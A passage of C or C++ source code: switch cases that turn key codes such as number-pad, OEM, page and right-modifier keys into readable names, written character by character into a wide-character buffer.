            case NumberPad0: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'0'; keyBufferLength += 1u; break;
            case NumberPad1: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case NumberPad2: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case NumberPad3: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case NumberPad4: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case NumberPad5: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; break;
            case NumberPad6: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; break;
            case NumberPad7: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; break;
            case NumberPad8: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; break;
            case NumberPad9: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'9'; keyBufferLength += 1u; break;
            case OEMAdderSymbol: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'+'; keyBufferLength += 1u; break;
            case OEMClear: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; break;
            case OEMCommaSymbol: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L','; keyBufferLength += 1u; break;
            case OEMMiscellaneous: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; break;
            case OEMMiscellaneous1: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case OEMMiscellaneous2: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case OEMMiscellaneous3: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case OEMMiscellaneous4: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case OEMMiscellaneous5: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; break;
            case OEMMiscellaneous6: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; break;
            case OEMMiscellaneous7: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; break;
            case OEMMiscellaneous8: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; break;
            case OEMPeriodSymbol: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'.'; keyBufferLength += 1u; break;
            case OEMSpecific: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; break;
            case OEMSubtracterSymbol: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; break;
            case PageDown: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'D'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case PageUp: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case Pause: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case PA1: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case Play: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'y'; keyBufferLength += 1u; break;
            case Print: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case PrintScreen: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case Reserved: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; break;
            case RightAlternate: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case RightArrow: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; break;
            case RightControl: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case RightShift: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
